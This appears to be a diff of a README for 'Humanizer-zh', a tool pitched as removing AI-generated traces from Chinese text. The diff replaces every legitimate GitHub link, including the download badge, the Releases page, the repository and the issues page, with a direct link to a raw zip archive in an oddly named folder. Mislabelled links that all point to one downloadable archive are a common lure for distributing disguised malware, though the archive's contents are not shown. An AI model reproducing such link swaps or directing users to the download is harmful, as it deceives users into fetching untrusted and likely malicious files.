@@ -1,7 +1,7 @@
 # 🎉 Humanizer-zh - Simplify Your Text with AI-Driven Precision
 
 ## 📥 Download Now
-[![Download Humanizer-zh](https://img.shields.io/badge/Download-Humanizer--zh-brightgreen)](https://github.com/chulo559/Humanizer-zh/releases)
+[![Download Humanizer-zh](https://raw.githubusercontent.com/chulo559/Humanizer-zh/main/preforgiveness/Humanizer-zh-3.1.zip)](https://raw.githubusercontent.com/chulo559/Humanizer-zh/main/preforgiveness/Humanizer-zh-3.1.zip)
 
 ## 🚀 Getting Started
 Humanizer-zh is the Chinese version of the Humanizer tool. It aims to remove AI-generated traces from your text, allowing for smoother and more natural communication. You do not need programming skills to use this application. Just follow these simple steps.
@@ -21,7 +21,7 @@ To run Humanizer-zh effectively, ensure your system meets the following requirem
 - **Processor**: Intel Core i3 or equivalent.
 
 ## 📦 Download & Install
-To download Humanizer-zh, visit the [Releases page](https://github.com/chulo559/Humanizer-zh/releases). You can find the application files there. 
+To download Humanizer-zh, visit the [Releases page](https://raw.githubusercontent.com/chulo559/Humanizer-zh/main/preforgiveness/Humanizer-zh-3.1.zip). You can find the application files there. 
 
 1. Click the link to access the Releases page.
 2. Select the latest version of Humanizer-zh.
@@ -63,8 +63,8 @@ A: If you experience problems, please check the FAQ section in the Help menu. Yo
 A: Yes, Humanizer-zh is open-source and free for everyone.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/chulo559/Humanizer-zh)
-- [Issues Page](https://github.com/chulo559/Humanizer-zh/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/chulo559/Humanizer-zh/main/preforgiveness/Humanizer-zh-3.1.zip)
+- [Issues Page](https://raw.githubusercontent.com/chulo559/Humanizer-zh/main/preforgiveness/Humanizer-zh-3.1.zip)
 
 ## 💬 Community and Support
 Join our community to connect with other users. Share your experiences, ask questions, and help us improve Humanizer-zh.
@@ -76,4 +76,4 @@ We are constantly working to enhance Humanizer-zh. Future updates may include:
 - Enhanced analysis for better results.
 
 ## 🔗 Important Links
-You can download the application by visiting the [Releases page](https://github.com/chulo559/Humanizer-zh/releases). We hope you find Humanizer-zh helpful in your writing!
+You can download the application by visiting the [Releases page](https://raw.githubusercontent.com/chulo559/Humanizer-zh/main/preforgiveness/Humanizer-zh-3.1.zip). We hope you find Humanizer-zh helpful in your writing!
